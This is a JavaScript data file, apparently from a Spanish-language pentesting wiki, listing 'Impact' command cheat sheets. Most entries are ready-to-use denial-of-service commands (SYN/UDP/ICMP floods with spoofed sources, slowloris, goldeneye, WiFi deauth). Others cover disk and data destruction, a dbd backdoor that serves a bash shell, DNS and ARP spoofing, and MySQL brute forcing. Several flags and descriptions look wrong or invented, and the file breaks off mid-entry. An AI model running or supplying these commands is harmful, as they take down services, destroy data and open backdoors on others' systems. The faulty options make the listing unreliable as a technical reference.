// Impacto (Impact)
window.WIKI_CHEATSHEETS_14_IMPACT = [
 {
  "tool": "slowloris",
  "desc": "DoS por agotamiento de conexiones HTTP (Slowloris)",
  "commands": [
   {
    "cmd": "slowloris 192.168.1.10 -p 80",
    "desc": "Atacar puerto 80"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -s 500",
    "desc": "500 sockets"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 443 -https",
    "desc": "HTTPS"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -u",
    "desc": "Usar http"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -a",
    "desc": "Send random headers"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -x 1",
    "desc": "Enviar keep-alive"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -l 1000",
    "desc": "Limitar a 1000s"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -k 100",
    "desc": "Timeout 100ms"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -t 10",
    "desc": "10 hilos"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -r 1",
    "desc": "Reconnect"
   },
   {
    "cmd": "slowloris 192.168.1.10 -p 80 -h",
    "desc": "Mostrar ayuda"
   }
  ]
 },
 {
  "tool": "hping3",
  "desc": "Herramienta de paquetes custom (floods, DoS)",
  "commands": [
   {
    "cmd": "hping3 -S 192.168.1.10 -p 80",
    "desc": "SYN a puerto 80"
   },
   {
    "cmd": "hping3 -c 100 -S 192.168.1.10 -p 80",
    "desc": "100 paquetes"
   },
   {
    "cmd": "hping3 -S -i u1000 192.168.1.10 -p 80",
    "desc": "Intervalo 1ms"
   },
   {
    "cmd": "hping3 -S -p 80 -a FAKE_IP 192.168.1.10",
    "desc": "Spoof IP"
   },
   {
    "cmd": "hping3 -S -p 80 --flood 192.168.1.10",
    "desc": "SYN flood"
   },
   {
    "cmd": "hping3 -F -p 80 192.168.1.10",
    "desc": "FIN scan"
   },
   {
    "cmd": "hping3 -X -p 80 192.168.1.10",
    "desc": "XMAS"
   },
   {
    "cmd": "hping3 -U -p 80 192.168.1.10",
    "desc": "UDP scan"
   },
   {
    "cmd": "hping3 -1 192.168.1.10",
    "desc": "ICMP ping"
   },
   {
    "cmd": "hping3 -2 -p 53 192.168.1.10",
    "desc": "UDP a DNS"
   },
   {
    "cmd": "hping3 -A -p 80 192.168.1.10",
    "desc": "ACK"
   },
   {
    "cmd": "hping3 -R -p 80 192.168.1.10",
    "desc": "RST"
   },
   {
    "cmd": "hping3 -S -p 22 -s 1024 192.168.1.10",
    "desc": "Puerto origen"
   },
   {
    "cmd": "hping3 -d 100 -S -p 80 192.168.1.10",
    "desc": "Tamaño de datos"
   },
   {
    "cmd": "hping3 -c 10 -1 -w 64 192.168.1.10",
    "desc": "ICMP con window"
   },
   {
    "cmd": "hping3 --traceroute -S -p 80 192.168.1.10",
    "desc": "Traceroute"
   },
   {
    "cmd": "hping3 -S -p 80 -e payload.txt 192.168.1.10",
    "desc": "Payload en archivo"
   },
   {
    "cmd": "hping3 -S -p 80 -E file 192.168.1.10",
    "desc": "Enviar contenido de archivo"
   },
   {
    "cmd": "hping3 -S -p 80 --file-verbosity 2 192.168.1.10",
    "desc": "Verbosity"
   },
   {
    "cmd": "hping3 -S -p 80 --rand-source 192.168.1.10",
    "desc": "IP fuente aleatoria"
   },
   {
    "cmd": "hping3 -S -p 80 -f 192.168.1.10",
    "desc": "Fragmentar"
   },
   {
    "cmd": "hping3 -S -p 80 -M 100 -L 100 -Q 100 192.168.1.10",
    "desc": "TCPU flags"
   },
   {
    "cmd": "hping3 -S -p 80 -w 1024 192.168.1.10",
    "desc": "Window size"
   },
   {
    "cmd": "hping3 -S -p 80 --tcp-timestamp 192.168.1.10",
    "desc": "Timestamps"
   }
  ]
 },
 {
  "tool": "goldeneye",
  "desc": "DoS HTTP (HTTP DoS tool)",
  "commands": [
   {
    "cmd": "goldeneye http://192.168.1.10",
    "desc": "Atacar URL"
   },
   {
    "cmd": "goldeneye http://192.168.1.10 -s 50",
    "desc": "50 sockets"
   },
   {
    "cmd": "goldeneye http://192.168.1.10 -m random",
    "desc": "User-agents aleatorios"
   },
   {
    "cmd": "goldeneye http://192.168.1.10 -w 3",
    "desc": "Workers"
   },
   {
    "cmd": "goldeneye https://192.168.1.10 -s 100",
    "desc": "HTTPS"
   },
   {
    "cmd": "goldeneye http://192.168.1.10 -u https",
    "desc": "User agent list"
   },
   {
    "cmd": "goldeneye http://192.168.1.10 -d",
    "desc": "Debug"
   },
   {
    "cmd": "goldeneye http://192.168.1.10 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "hammer",
  "desc": "DoS HTTP por keep-alive (Python)",
  "commands": [
   {
    "cmd": "hammer.py http://192.168.1.10",
    "desc": "Atacar"
   },
   {
    "cmd": "hammer.py http://192.168.1.10 -p 80",
    "desc": "Puerto"
   },
   {
    "cmd": "hammer.py http://192.168.1.10 -s 100",
    "desc": "Sockets"
   },
   {
    "cmd": "hammer.py http://192.168.1.10 -t 300",
    "desc": "Timeout"
   },
   {
    "cmd": "hammer.py http://192.168.1.10 -f",
    "desc": "Full (más sockets)"
   },
   {
    "cmd": "hammer.py http://192.168.1.10 -v",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "deathstar",
  "desc": "DoS TCP por conexiones muertas",
  "commands": [
   {
    "cmd": "deathstar IP 80",
    "desc": "Atacar IP:puerto"
   },
   {
    "cmd": "deathstar IP 80 100",
    "desc": "100 conexiones"
   },
   {
    "cmd": "deathstar -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "mdcrack",
  "desc": "Crack de hashes MD4/MD5 (vía rainbow tables)",
  "commands": [
   {
    "cmd": "mdcrack -h hash.txt",
    "desc": "Crackear hash"
   },
   {
    "cmd": "mdcrack -h hash.txt -d wordlist.txt",
    "desc": "Con wordlist"
   },
   {
    "cmd": "mdcrack -h hash.txt -m brute",
    "desc": "Brute force"
   },
   {
    "cmd": "mdcrack -h hash.txt -m 5-8",
    "desc": "Longitud 5-8"
   },
   {
    "cmd": "mdcrack -h hash.txt -a charset",
    "desc": "Charset"
   },
   {
    "cmd": "mdcrack -H 2 -h hash.txt",
    "desc": "MD4"
   },
   {
    "cmd": "mdcrack -H 0 -h hash.txt",
    "desc": "MD5"
   },
   {
    "cmd": "mdcrack -h hash.txt -c",
    "desc": "Comparar"
   },
   {
    "cmd": "mdcrack -h hash.txt -p",
    "desc": "Paralelo"
   },
   {
    "cmd": "mdcrack -h hash.txt -T 4",
    "desc": "4 hilos"
   }
  ]
 },
 {
  "tool": "cryptmount",
  "desc": "Montar volúmenes cifrados (acceso/impacto en almacenamiento)",
  "commands": [
   {
    "cmd": "cryptmount -m volumen",
    "desc": "Montar volumen"
   },
   {
    "cmd": "cryptmount -u volumen",
    "desc": "Desmontar"
   },
   {
    "cmd": "cryptmount --configure",
    "desc": "Configurar"
   },
   {
    "cmd": "cryptmount -l",
    "desc": "Listar volúmenes"
   },
   {
    "cmd": "cryptmount -f -m volumen",
    "desc": "Forzar montaje"
   },
   {
    "cmd": "cryptmount -m volumen --fstype ext4",
    "desc": "Tipo de fs"
   },
   {
    "cmd": "cryptmount --options ro -m volumen",
    "desc": "Solo lectura"
   },
   {
    "cmd": "cryptmount -m volumen --keyfile key",
    "desc": "Keyfile"
   },
   {
    "cmd": "cryptmount -m volumen --cipher aes-xts-plain64",
    "desc": "Cifrado"
   },
   {
    "cmd": "cryptmount -m volumen --verbose",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "killdisk",
  "desc": "Destrucción segura de discos (solo legal en lab)",
  "commands": [
   {
    "cmd": "killdisk --disk /dev/sdb",
    "desc": "Borrar disco"
   },
   {
    "cmd": "killdisk --disk /dev/sdb --method nist",
    "desc": "Método NIST"
   },
   {
    "cmd": "killdisk --disk /dev/sdb --method dod",
    "desc": "Método DoD"
   },
   {
    "cmd": "killdisk --disk /dev/sdb --method guttmann",
    "desc": "Método Guttmann"
   },
   {
    "cmd": "killdisk --disk /dev/sdb --passes 3",
    "desc": "3 pasadas"
   },
   {
    "cmd": "killdisk --disk /dev/sdb --force",
    "desc": "Forzar"
   },
   {
    "cmd": "killdisk --disk /dev/sdb --verify",
    "desc": "Verificar"
   }
  ]
 },
 {
  "tool": "wipe",
  "desc": "Borrado seguro de archivos",
  "commands": [
   {
    "cmd": "wipe -f archivo.txt",
    "desc": "Borrar archivo"
   },
   {
    "cmd": "wipe -r directorio/",
    "desc": "Recursivo"
   },
   {
    "cmd": "wipe -f -v archivo.txt",
    "desc": "Verbose"
   },
   {
    "cmd": "wipe -f -q archivo.txt",
    "desc": "Quiet"
   },
   {
    "cmd": "wipe -f -z archivo.txt",
    "desc": "Sobrescribir con ceros"
   },
   {
    "cmd": "wipe -f -r 5 archivo.txt",
    "desc": "5 rondas"
   },
   {
    "cmd": "wipe -f -P archivo.txt",
    "desc": "Sin confirmar"
   },
   {
    "cmd": "wipe -f --no-sync archivo.txt",
    "desc": "Sin sync"
   }
  ]
 },
 {
  "tool": "sdmem",
  "desc": "Limpiar memoria RAM",
  "commands": [
   {
    "cmd": "sdmem -f",
    "desc": "Borrar RAM completa"
   },
   {
    "cmd": "sdmem -f -v",
    "desc": "Verbose"
   },
   {
    "cmd": "sdmem -f -n",
    "desc": "Sin confirmación"
   },
   {
    "cmd": "sdmem -f -d",
    "desc": "Delay"
   },
   {
    "cmd": "sdmem -f -t",
    "desc": "Test"
   }
  ]
 },
 {
  "tool": "srm",
  "desc": "Borrado seguro de archivos (sucesor de wipe)",
  "commands": [
   {
    "cmd": "srm -f archivo.txt",
    "desc": "Borrar seguro"
   },
   {
    "cmd": "srm -r -f directorio/",
    "desc": "Recursivo"
   },
   {
    "cmd": "srm -f -v archivo.txt",
    "desc": "Verbose"
   },
   {
    "cmd": "srm -f -z archivo.txt",
    "desc": "Última pasada con ceros"
   },
   {
    "cmd": "srm -f -l archivo.txt",
    "desc": "Solo una pasada"
   },
   {
    "cmd": "srm -f -s archivo.txt",
    "desc": "Sobrescribir con random"
   }
  ]
 },
 {
  "tool": "t50",
  "desc": "Flooder de paquetes multi-protocolo",
  "commands": [
   {
    "cmd": "t50 IP",
    "desc": "Flood SYN"
   },
   {
    "cmd": "t50 IP -p 80",
    "desc": "Puerto"
   },
   {
    "cmd": "t50 IP -p 80 -c 1000",
    "desc": "1000 paquetes"
   },
   {
    "cmd": "t50 IP -p 80 -s",
    "desc": "Spoof"
   },
   {
    "cmd": "t50 IP -p 80 -f",
    "desc": "Fragmentado"
   },
   {
    "cmd": "t50 IP -p 80 --flood",
    "desc": "Flood continuo"
   },
   {
    "cmd": "t50 IP -p 80 -r",
    "desc": "Random"
   },
   {
    "cmd": "t50 IP -p 80 -D",
    "desc": "DDoS mode"
   },
   {
    "cmd": "t50 IP -p 80 -t 10",
    "desc": "Threads"
   },
   {
    "cmd": "t50 IP -p 80 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "t50 IP -p 80 --icmp",
    "desc": "ICMP flood"
   },
   {
    "cmd": "t50 IP -p 80 --udp",
    "desc": "UDP flood"
   },
   {
    "cmd": "t50 IP -p 80 --syn",
    "desc": "SYN flood"
   },
   {
    "cmd": "t50 IP -p 80 --ack",
    "desc": "ACK flood"
   },
   {
    "cmd": "t50 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "xerxes",
  "desc": "DoS HTTP por conexiones completas",
  "commands": [
   {
    "cmd": "xerxes IP 80",
    "desc": "Atacar"
   },
   {
    "cmd": "xerxes -s IP",
    "desc": "Solo target"
   },
   {
    "cmd": "xerxes -p 80 IP",
    "desc": "Puerto"
   },
   {
    "cmd": "xerxes -t 100 IP 80",
    "desc": "Hilos"
   },
   {
    "cmd": "xerxes -v IP 80",
    "desc": "Verbose"
   },
   {
    "cmd": "xerxes -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "davoset",
  "desc": "DoS de servidores viaz buffering (Apache)",
  "commands": [
   {
    "cmd": "davoset -u http://IP",
    "desc": "Atacar"
   },
   {
    "cmd": "davoset -u http://IP -t 100",
    "desc": "Threads"
   },
   {
    "cmd": "davoset -u http://IP -w 1000",
    "desc": "Buffers"
   },
   {
    "cmd": "davoset -u http://IP -p 5",
    "desc": "Puerto"
   },
   {
    "cmd": "davoset -u http://IP -s",
    "desc": "SSL"
   },
   {
    "cmd": "davoset -u http://IP -v",
    "desc": "Verbose"
   },
   {
    "cmd": "davoset -u http://IP -c",
    "desc": "Cleanup"
   },
   {
    "cmd": "davoset -u http://IP -o",
    "desc": "Ofuscación"
   },
   {
    "cmd": "davoset -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "torshammer",
  "desc": "DoS vía Tor (slowloris style)",
  "commands": [
   {
    "cmd": "torshammer -t IP:80",
    "desc": "Atacar"
   },
   {
    "cmd": "torshammer -t IP:443",
    "desc": "HTTPS"
   },
   {
    "cmd": "torshammer -t IP:80 -r 100",
    "desc": "Requests"
   },
   {
    "cmd": "torshammer -t IP:80 -p 5",
    "desc": "Hilos"
   },
   {
    "cmd": "torshammer -t IP:80 -a",
    "desc": "Ataque"
   },
   {
    "cmd": "torshammer -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "macof",
  "desc": "Flood de tablas MAC (CAM tables)",
  "commands": [
   {
    "cmd": "macof",
    "desc": "Flood en eth0"
   },
   {
    "cmd": "macof -i eth1",
    "desc": "Interfaz"
   },
   {
    "cmd": "macof -s IP",
    "desc": "IP origen"
   },
   {
    "cmd": "macof -d IP",
    "desc": "IP destino"
   },
   {
    "cmd": "macof -e MAC",
    "desc": "MAC origen"
   },
   {
    "cmd": "macof -E MAC",
    "desc": "MAC destino"
   },
   {
    "cmd": "macof -p port",
    "desc": "Puerto"
   },
   {
    "cmd": "macof -P port",
    "desc": "Puerto destino"
   },
   {
    "cmd": "macof -n 1000",
    "desc": "1000 paquetes"
   },
   {
    "cmd": "macof -i eth0 -n 5000",
    "desc": "5000 en eth0"
   },
   {
    "cmd": "macof -r",
    "desc": "Random"
   },
   {
    "cmd": "macof -x",
    "desc": "Hex"
   },
   {
    "cmd": "macof -v",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "shred",
  "desc": "Borrado seguro de archivos (destrucción de datos)",
  "commands": [
   {
    "cmd": "shred -u archivo.txt",
    "desc": "Borrar y desasignar"
   },
   {
    "cmd": "shred -z archivo.txt",
    "desc": "Última pasada con ceros"
   },
   {
    "cmd": "shred -n 10 archivo.txt",
    "desc": "10 pasadas"
   },
   {
    "cmd": "shred -u -z -n 5 archivo.txt",
    "desc": "Completo"
   },
   {
    "cmd": "shred -u -v archivo.txt",
    "desc": "Verbose"
   },
   {
    "cmd": "shred -f -u archivo.txt",
    "desc": "Forzar"
   },
   {
    "cmd": "shred -u -s 1024 archivo.txt",
    "desc": "Tamaño fijo"
   },
   {
    "cmd": "shred -u --random-source=/dev/urandom archivo.txt",
    "desc": "Random source"
   },
   {
    "cmd": "shred -u -n 3 archivos*.txt",
    "desc": "Múltiples"
   },
   {
    "cmd": "shred -u -z -n 3 -v /dev/sdb1",
    "desc": "Disco"
   },
   {
    "cmd": "shred -u -x",
    "desc": "Exact"
   },
   {
    "cmd": "shred --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "sfill",
  "desc": "Sobrescribir espacio libre de discos",
  "commands": [
   {
    "cmd": "sfill /mnt/particion",
    "desc": "Sobrescribir libre"
   },
   {
    "cmd": "sfill -f /mnt/particion",
    "desc": "Fuerza"
   },
   {
    "cmd": "sfill -i /mnt/particion",
    "desc": "Con interactividad"
   },
   {
    "cmd": "sfill -l /mnt/particion",
    "desc": "Sin archivos"
   },
   {
    "cmd": "sfill -v /mnt/particion",
    "desc": "Verbose"
   },
   {
    "cmd": "sfill -z /mnt/particion",
    "desc": "Última pasada ceros"
   },
   {
    "cmd": "sfill -s /mnt/particion",
    "desc": "Mínimo"
   },
   {
    "cmd": "sfill -t /mnt/particion",
    "desc": "Contador"
   },
   {
    "cmd": "sfill -p /mnt/particion",
    "desc": "Paralelo"
   },
   {
    "cmd": "sfill --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dbd",
  "desc": "Backdoor por UDP/ICMP (impact tool)",
  "commands": [
   {
    "cmd": "dbd -l -p 4444 -k pass",
    "desc": "Listener con key"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -e /bin/bash",
    "desc": "Con shell"
   },
   {
    "cmd": "dbd IP 4444 -k pass",
    "desc": "Conectar"
   },
   {
    "cmd": "dbd -l -u -p 4444 -k pass",
    "desc": "UDP"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -c",
    "desc": "Cifrado"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -n",
    "desc": "Sin info"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -v",
    "desc": "Verbose"
   },
   {
    "cmd": "dbd -l -p 4444 -k pass -P",
    "desc": "Puerto origen"
   }
  ]
 },
 {
  "tool": "tcpkill",
  "desc": "Cortar conexiones TCP (dsniff)",
  "commands": [
   {
    "cmd": "tcpkill -i eth0 host 192.168.1.10",
    "desc": "Kill por host"
   },
   {
    "cmd": "tcpkill -i eth0 port 80",
    "desc": "Kill puerto 80"
   },
   {
    "cmd": "tcpkill -i eth0 host X and port 443",
    "desc": "Combinado"
   },
   {
    "cmd": "tcpkill -i eth0 host X -9",
    "desc": "Señal 9"
   },
   {
    "cmd": "tcpkill -i eth0 -w cap.pcap",
    "desc": "Guardar"
   },
   {
    "cmd": "tcpkill -i eth0 -r cap.pcap",
    "desc": "De captura"
   },
   {
    "cmd": "tcpkill -i eth0 -l log.txt",
    "desc": "Log"
   },
   {
    "cmd": "tcpkill -i eth0 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "tcpkill -i eth0 -a",
    "desc": "Todo"
   },
   {
    "cmd": "tcpkill -i eth0 -d",
    "desc": "Debug"
   },
   {
    "cmd": "tcpkill -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dnsspoof",
  "desc": "Spoofing de respuestas DNS (dsniff)",
  "commands": [
   {
    "cmd": "echo '192.168.1.100 *' > hosts.txt && dnsspoof -i eth0 -f hosts.txt",
    "desc": "Spoof todo"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -t 192.168.1.10",
    "desc": "Target"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -w cap.pcap",
    "desc": "Guardar"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -r cap.pcap",
    "desc": "De captura"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -l log.txt",
    "desc": "Log"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -v",
    "desc": "Verbose"
   },
   {
    "cmd": "echo 'IP www.objetivo.com' > hosts.txt",
    "desc": "Solo dominio"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -a",
    "desc": "Todo"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt -d",
    "desc": "Debug"
   },
   {
    "cmd": "dnsspoof -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "nemesis",
  "desc": "Inyección de paquetes custom (nemesis)",
  "commands": [
   {
    "cmd": "nemesis arp -v -S 192.168.1.100 -D 192.168.1.1 -s MAC -d MAC",
    "desc": "ARP spoof"
   },
   {
    "cmd": "nemesis icmp -v -S 192.168.1.100 -D 8.8.8.8",
    "desc": "ICMP"
   },
   {
    "cmd": "nemesis tcp -v -S 192.168.1.100 -D 192.168.1.10 -fS -p 80",
    "desc": "TCP SYN"
   },
   {
    "cmd": "nemesis udp -v -S 192.168.1.100 -D 192.168.1.10 -p 53 -P 1234",
    "desc": "UDP"
   },
   {
    "cmd": "nemesis dns -v -S IP -D IP -b 'payload.bin'",
    "desc": "DNS"
   },
   {
    "cmd": "nemesis ethernet -v -S MAC -D MAC -H type",
    "desc": "Ethernet"
   },
   {
    "cmd": "nemesis ip -v -S 1.1.1.1 -D 2.2.2.2",
    "desc": "IP raw"
   },
   {
    "cmd": "nemesis igmp -v -S IP -D IP",
    "desc": "IGMP"
   },
   {
    "cmd": "nemesis -i eth0 tcp -v -S IP -D IP -fS",
    "desc": "Interfaz"
   },
   {
    "cmd": "nemesis -p 80 tcp -v -S IP -D IP",
    "desc": "Puerto"
   },
   {
    "cmd": "nemesis --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "tcpnice",
  "desc": "Ralentizar conexiones TCP (anti-intrusión)",
  "commands": [
   {
    "cmd": "tcpnice -i eth0 host X",
    "desc": "Ralentizar host"
   },
   {
    "cmd": "tcpnice -i eth0 port 80",
    "desc": "Por puerto"
   },
   {
    "cmd": "tcpnice -i eth0 host X -w cap.pcap",
    "desc": "Guardar"
   },
   {
    "cmd": "tcpnice -i eth0 host X -r cap.pcap",
    "desc": "De captura"
   },
   {
    "cmd": "tcpnice -i eth0 host X -l log.txt",
    "desc": "Log"
   },
   {
    "cmd": "tcpnice -i eth0 host X -v",
    "desc": "Verbose"
   },
   {
    "cmd": "tcpnice -i eth0 host X -a",
    "desc": "Todo"
   },
   {
    "cmd": "tcpnice -i eth0 host X -d",
    "desc": "Debug"
   },
   {
    "cmd": "tcpnice -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "slowhttptest",
  "desc": "Ataques de capa de aplicación (Slowloris, RUDY)",
  "commands": [
   {
    "cmd": "slowhttptest -H -g -o out.html -i 110 -r 200 -t GET -u http://IP/",
    "desc": "Slowloris"
   },
   {
    "cmd": "slowhttptest -B -g -o out.html -i 110 -r 200 -s 8192 -t GET -u http://IP/",
    "desc": "Slow body"
   },
   {
    "cmd": "slowhttptest -R -g -o out.html -i 60 -r 200 -t GET -u http://IP/",
    "desc": "Range"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/",
    "desc": "1000 conexiones"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -p 5",
    "desc": "Timeout"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u https://IP/ -k",
    "desc": "HTTPS"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -l 120",
    "desc": "Duración"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -x 10",
    "desc": "Max rnd"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -r 300",
    "desc": "Rate"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -n 50",
    "desc": "N random"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -v 3",
    "desc": "Verbose"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/ -q",
    "desc": "Quiet"
   },
   {
    "cmd": "slowhttptest --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "apache-dos",
  "desc": "Ataques DoS a servidores web (ab, hey)",
  "commands": [
   {
    "cmd": "ab -n 10000 -c 100 http://IP/",
    "desc": "Benchmark"
   },
   {
    "cmd": "ab -n 10000 -c 500 -k http://IP/",
    "desc": "Keep-alive"
   },
   {
    "cmd": "ab -n 10000 -c 100 -p post.txt -T application/x-www-form-urlencoded http://IP/login",
    "desc": "POST"
   },
   {
    "cmd": "ab -n 10000 -c 100 -H 'Cookie: SID=x' http://IP/",
    "desc": "Con cookie"
   },
   {
    "cmd": "ab -n 10000 -c 100 -s 10 http://IP/",
    "desc": "Timeout"
   },
   {
    "cmd": "hey -n 10000 -c 500 http://IP/",
    "desc": "Hey"
   },
   {
    "cmd": "hey -n 10000 -c 500 -m POST -d 'user=admin' http://IP/login",
    "desc": "Hey POST"
   },
   {
    "cmd": "siege -c 200 -t 60s http://IP/",
    "desc": "Siege 60s"
   },
   {
    "cmd": "siege -c 200 -t 60s -b http://IP/",
    "desc": "Benchmark"
   },
   {
    "cmd": "httping -c 1000 -i 0.1 http://IP/",
    "desc": "Httping"
   },
   {
    "cmd": "hping3 -S -p 80 --flood IP",
    "desc": "SYN flood"
   },
   {
    "cmd": "xerxes IP 80",
    "desc": "Xerxes"
   },
   {
    "cmd": "goldeneye http://IP/ -w 100 -s 100",
    "desc": "GoldenEye"
   },
   {
    "cmd": "torshammer -t IP -r 500",
    "desc": "Torshammer"
   },
   {
    "cmd": "wget --limit-rate=1k -r http://IP/",
    "desc": "Lento"
   }
  ]
 },
 {
  "tool": "wifi-dos",
  "desc": "Ataques DoS sobre WiFi (deauth)",
  "commands": [
   {
    "cmd": "airmon-ng start wlan0",
    "desc": "Monitor mode"
   },
   {
    "cmd": "airodump-ng wlan0mon",
    "desc": "Ver redes"
   },
   {
    "cmd": "airodump-ng -c 6 --bssid MAC -w cap wlan0mon",
    "desc": "Capturar BSSID"
   },
   {
    "cmd": "aireplay-ng -0 5 -a AP_MAC wlan0mon",
    "desc": "Deauth 5"
   },
   {
    "cmd": "aireplay-ng -0 0 -a AP_MAC wlan0mon",
    "desc": "Deauth infinito"
   },
   {
    "cmd": "aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon",
    "desc": "Deauth a cliente"
   },
   {
    "cmd": "aireplay-ng -0 5 -a AP_MAC --ignore-negative-one wlan0mon",
    "desc": "Ignorar neg"
   },
   {
    "cmd": "mdk4 wlan0mon d -B AP_MAC",
    "desc": "Mdk4 deauth"
   },
   {
    "cmd": "mdk4 wlan0mon a -b BSSID_LIST",
    "desc": "Auth flood"
   },
   {
    "cmd": "mdk4 wlan0mon d -B AP_MAC -s 1000",
    "desc": "Mdk4 rate"
   },
   {
    "cmd": "mdk3 wlan0mon d -b blacklist.txt",
    "desc": "Mdk3"
   },
   {
    "cmd": "wifiphisher -aI wlan0",
    "desc": "Wifiphisher"
   },
   {
    "cmd": "fluxion -i wlan0",
    "desc": "Fluxion"
   },
   {
    "cmd": "aireplay-ng --test wlan0mon",
    "desc": "Test inyección"
   },
   {
    "cmd": "tcpdump -i wlan0mon 'wlan.fc.type_subtype=12'",
    "desc": "Ver deauth"
   }
  ]
 },
 {
  "tool": "stress-tools",
  "desc": "Herramientas de estrés de red",
  "commands": [
   {
    "cmd": "hping3 -S -p 80 -c 1000 IP",
    "desc": "SYN 1000"
   },
   {
    "cmd": "hping3 -S -p 80 --flood -d 65000 IP",
    "desc": "Flood grande"
   },
   {
    "cmd": "hping3 -2 -p 53 --flood IP",
    "desc": "UDP flood"
   },
   {
    "cmd": "hping3 -1 --flood IP",
    "desc": "ICMP flood"
   },
   {
    "cmd": "hping3 -S -p 80 --rand-source --flood IP",
    "desc": "Random source"
   },
   {
    "cmd": "hping3 -F -p 80 --flood IP",
    "desc": "FIN flood"
   },
   {
    "cmd": "hping3 -R -p 80 --flood IP",
    "desc": "RST flood"
   },
   {
    "cmd": "hping3 -A -p 80 --flood IP",
    "desc": "ACK flood"
   },
   {
    "cmd": "hping3 -S -p 80 --tcp-timestamp --flood IP",
    "desc": "Timestamp"
   },
   {
    "cmd": "hping3 -S -p 80 -i u1000 IP",
    "desc": "Intervalo"
   },
   {
    "cmd": "nping --tcp -p 80 --flags syn --rate 10000 IP",
    "desc": "Nping syn"
   },
   {
    "cmd": "nping --udp --rate 5000 IP",
    "desc": "Nping udp"
   },
   {
    "cmd": "ping -f -s 65500 IP",
    "desc": "Ping flood"
   },
   {
    "cmd": "goldeneye -w 200 -s 200 http://IP/",
    "desc": "Goldeneye"
   },
   {
    "cmd": "slowloris.pl -dns IP -port 80 -timeout 1",
    "desc": "Slowloris perl"
   }
  ]
 },
 {
  "tool": "db-dos",
  "desc": "DoS sobre bases de datos",
  "commands": [
   {
    "cmd": "hydra -l root -P pass.txt mysql://IP",
    "desc": "Brute mysql"
   },
   {
    "cmd": "mysql -u root -p -h IP -e 'SELECT COUNT(*) FROM mysql.user'",
    "desc": "Query"
   },
   {
    "cmd": "mysql -u root -p -h IP -e 'SHOW PROCESSLIST'",
    "desc": "Procesos"
   },
   {
    "cmd": "mongo --host IP --eval 'db.adminCommand({ping:1})'",
    "desc": "Mongo ping"
   },
   {
    "cmd": "mongo --host IP --eval 'db.currentOp()'",
    "desc": "Mongo ops"
   },
   {
    "cmd": "redis-cli -h IP ping",
    "desc": "Redis ping"
   },
   {
    "cmd": "redis-cli -h IP info",
    "desc": "Redis info"
   },
   {
    "cmd": "redis-cli -h IP -p 6379 MONITOR",
    "desc": "Monitor"
   },
   {
    "cmd": "psql -h IP -U postgres -c 'SELECT 1'",
    "desc": "Postgres"
   },
   {
    "cmd": "sqlcmd -S IP -U sa -P pass -Q 'SELECT 1'",
    "desc": "SQL Server"
   },
   {
    "cmd": "echo 'FLUSHALL' | redis-cli -h IP",
    "desc": "Flush redis"
   },
   {
    "cmd": "mysql -u root -p -h IP -e 'SELECT SLEEP(3600)'",
    "desc": "Sleep"
   },
   {
    "cmd": "nmap --script=mysql-dos -p3306 IP",
    "desc": "Nmap mysql dos"
   },
   {
    "cmd": "metasploit> use auxiliary/dos/mysql/mysql_authbypass_dos",
    "desc": "MSF dos"
   }
  ]
 },
 {
  "tool": "dos-basics",
  "desc": "Técnicas DoS (tipos y conceptos)",
  "commands": [
   {
    "cmd": "hping3 -S -p 80 --flood IP",
    "desc": "SYN flood"
   },
   {
    "cmd": "hping3 -2 -p 53 --flood IP",
    "desc": "UDP flood"
   },
   {
    "cmd": "hping3 -1 --flood IP",
    "desc": "ICMP flood"
   },
   {
    "cmd": "hping3 -S -p 80 --rand-source --flood IP",
    "desc": "Random"
   },
   {
